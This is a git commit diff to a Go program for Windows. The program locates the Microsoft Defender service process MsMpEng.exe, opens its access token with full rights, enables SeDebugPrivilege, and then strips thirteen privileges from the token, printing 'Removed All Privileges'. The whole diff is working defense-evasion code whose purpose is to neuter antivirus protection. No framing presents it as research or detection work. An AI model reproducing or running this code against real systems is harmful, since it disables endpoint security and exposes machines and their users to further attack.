ab5605a0c19db7ae6b0487269d5a87aa5701015e
赵公子 <zha0gongz1@protonmail.com>
2022-03-12 21:38:34 +0800

    Update main.go

--- main.go
+++ main.go
@@ -4,6 +4,8 @@ import (
 	"bytes"
 	"fmt"
 	"golang.org/x/sys/windows"
+	"log"
+	"reflect"
 	"strings"
 	"syscall"
 	"unsafe"
@@ -11,7 +13,21 @@ import (
 
 const (
 	Th32cs_Snapprpcess = 0x00000002
-	SE_DEBUG_NAME	= "SeDebugPrivilege"
+	SE_DEBUG_NAME                  = "SeDebugPrivilege"
+	SE_CHANGE_NOTIFY_NAME          = "SeChangeNotifyPrivilege"
+	SE_TCB_NAME                    = "SeTcbPrivilege"
+	SE_IMPERSONATE_NAME            = "SeImpersonatePrivilege"
+	SE_LOAD_DRIVER_NAME            = "SeLoadDriverPrivilege"
+	SE_RESTORE_NAME                = "SeRestorePrivilege"
+	SE_BACKUP_NAME                 = "SeBackupPrivilege"
+	SE_SECURITY_NAME               = "SeSecurityPrivilege"
+	SE_SYSTEM_ENVIRONMENT_NAME     = "SeSystemEnvironmentPrivilege"
+	SE_INCREASE_QUOTA_NAME         = "SeIncreaseQuotaPrivilege"
+	SE_TAKE_OWNERSHIP_NAME         = "SeTakeOwnershipPrivilege"
+	SE_INC_BASE_PRIORITY_NAME      = "SeIncreaseBasePriorityPrivilege"
+	SE_SHUTDOWN_NAME               = "SeShutdownPrivilege"
+	SE_ASSIGNPRIMARYTOKEN_NAME     = "SeAssignPrimaryTokenPrivilege"
+	SE_PRIVILEGE_REMOVED            = 0X00000004
 )
 
 type WindowsProcess struct {
@@ -20,20 +36,6 @@ type WindowsProcess struct {
 	Exe             string
 }
 
-type LUID struct {
-	LowPart  uint32
-	HighPart int32
-}
-
-type LUID_AND_ATTRIBUTES struct {
-	Luid       LUID
-	Attributes uint32
-}
-
-type TOKEN_PRIVILEGES struct {
-	PrivilegeCount uint32
-	Privileges     [1]LUID_AND_ATTRIBUTES
-}
 
 func newWindowsProcess(e *syscall.ProcessEntry32) WindowsProcess {
 	// Find when the string ends for decoding
@@ -91,35 +93,107 @@ func FindProcessByName(processes []WindowsProcess, name string) *WindowsProcess 
 	return nil
 }
 
+func SetPrivilege(hToken windows.Token,lpszPrivilege *uint16,bEnablePrivilege bool)(PanDan bool){
+	//var hToken syscall.Token
+	var tp windows.Tokenprivileges
+	var luid windows.LUID
+	err :=windows.LookupPrivilegeValue(nil, lpszPrivilege, &luid)
+	if err != nil {
+		log.Fatal(err)
+	}
+	tp.PrivilegeCount = 1
+	tp.Privileges[0].Luid = luid
+	if !bEnablePrivilege{
+		tp.Privileges[0].Attributes = SE_PRIVILEGE_REMOVED
+	}else{
+		tp.Privileges[0].Attributes = SE_PRIVILEGE_REMOVED
+	}
+
+	// Enable the privilege or disable all privileges.
+	var tokenPriviledge windows.Tokenprivileges
+	tokenPrivLen := uint32(unsafe.Sizeof(tokenPriviledge))
+	err = windows.AdjustTokenPrivileges(hToken, false, &tp, tokenPrivLen, nil, nil)
+	if err != nil {
+		log.Fatal(err)				
+		return false
+	}else{
+		return true
+	}
+}
+
 func main() {
 	parentName := "MsMpEng.exe"
 	procS, _ := Processes()
-	ParentInfo := FindProcessByName(procS, parentName) //找到指定进程的进程标识符PID
+	ParentInfo := FindProcessByName(procS, parentName) 
 	if ParentInfo != nil {
-		// found it
-		fmt.Println("I got it!")
-		//Spoof
-		pid := uint32(ParentInfo.ProcessID)	//根据内存地址找到进程，并输出pid号
+		pid := uint32(ParentInfo.ProcessID)	
 		fmt.Println(pid)
 		const ProcessQueryInformation = windows.PROCESS_QUERY_LIMITED_INFORMATION
-		pHandle, _ := syscall.OpenProcess(ProcessQueryInformation, false, pid)
-
-		//fmt.Println(reflect.TypeOf(pHandle))
-		//uintpHandle := uintptr(pHandle)
-		var ptoken syscall.Token
-		token :=syscall.OpenProcessToken(pHandle, syscall.TOKEN_ALL_ACCESS, &ptoken)
-		if token !=nil{
-			fmt.Println("[*] Opened Target Token Handle")
-		} else {
-			fmt.Println("[-] Failed to open Token Handle")
-		}
-
-		privStr, _ := syscall.UTF16PtrFromString(SE_DEBUG_NAME)
-		luid := windows.LUID{}
-		err := windows.LookupPrivilegeValue(nil,privStr,&luid)
+		//pHandle, _ := syscall.OpenProcess(ProcessQueryInformation, false, pid)
+		pHandle, err := windows.OpenProcess(ProcessQueryInformation, false, pid)	
 		if err != nil {
-			fmt.Println(err)
+			log.Fatal(err)
 		}
+		fmt.Println(reflect.TypeOf(pHandle))
+		//uintpHandle := uintptr(pHandle)
+		var ptoken windows.Token
+
+		err = windows.OpenProcessToken(pHandle, windows.TOKEN_ALL_ACCESS, &ptoken)
+		if err != nil {
+			log.Fatal(err)
+		}
+
+		privStr, _ := windows.UTF16PtrFromString(SE_DEBUG_NAME)
+
+		var luid windows.LUID
+		err = windows.LookupPrivilegeValue(nil,privStr,&luid)
+		if err != nil {
+			log.Fatal(err)
+		}
+
+		var tokenPriviledges windows.Tokenprivileges
+		tokenPriviledges.PrivilegeCount = 1
+		tokenPriviledges.Privileges[0].Luid = luid
+		tokenPriviledges.Privileges[0].Attributes = windows.SE_PRIVILEGE_ENABLED
+
+		// Adjust token privs
+		tokPrivLen := uint32(unsafe.Sizeof(tokenPriviledges))
+		log.Println(fmt.Sprintf("[+] Current token length is: %d", tokPrivLen))
+
+		err = windows.AdjustTokenPrivileges(ptoken, false, &tokenPriviledges, tokPrivLen, nil, nil)
+		if err != nil {
+			log.Fatal(err)
+		}
+
+		// Remove all privileges
+		privStr0, _ := windows.UTF16PtrFromString(SE_DEBUG_NAME)
+		SetPrivilege(ptoken,privStr0,true)
+		privStr0, _ = windows.UTF16PtrFromString(SE_CHANGE_NOTIFY_NAME)
+		SetPrivilege(ptoken,privStr0,true)
+		privStr0, _ = windows.UTF16PtrFromString(SE_TCB_NAME)
+		SetPrivilege(ptoken,privStr0,true)
+		privStr0, _ = windows.UTF16PtrFromString(SE_IMPERSONATE_NAME)
+		SetPrivilege(ptoken,privStr0,true)
+		privStr0, _ = windows.UTF16PtrFromString(SE_RESTORE_NAME)
+		SetPrivilege(ptoken,privStr0,true)
+		privStr0, _ = windows.UTF16PtrFromString(SE_BACKUP_NAME)
+		SetPrivilege(ptoken,privStr0,true)
+		privStr0, _ = windows.UTF16PtrFromString(SE_SECURITY_NAME)
+		SetPrivilege(ptoken,privStr0,true)
+		privStr0, _ = windows.UTF16PtrFromString(SE_SYSTEM_ENVIRONMENT_NAME)
+		SetPrivilege(ptoken,privStr0,true)
+		privStr0, _ = windows.UTF16PtrFromString(SE_INCREASE_QUOTA_NAME)
+		SetPrivilege(ptoken,privStr0,true)
+		privStr0, _ = windows.UTF16PtrFromString(SE_TAKE_OWNERSHIP_NAME)
+		SetPrivilege(ptoken,privStr0,true)
+		privStr0, _ = windows.UTF16PtrFromString(SE_INC_BASE_PRIORITY_NAME)
+		SetPrivilege(ptoken,privStr0,true)
+		privStr0, _ = windows.UTF16PtrFromString(SE_SHUTDOWN_NAME)
+		SetPrivilege(ptoken,privStr0,true)
+		privStr0, _ = windows.UTF16PtrFromString(SE_ASSIGNPRIMARYTOKEN_NAME)
+		SetPrivilege(ptoken,privStr0,true)
+
+		fmt.Println("[*] Removed All Privileges")
 
 	}
 }
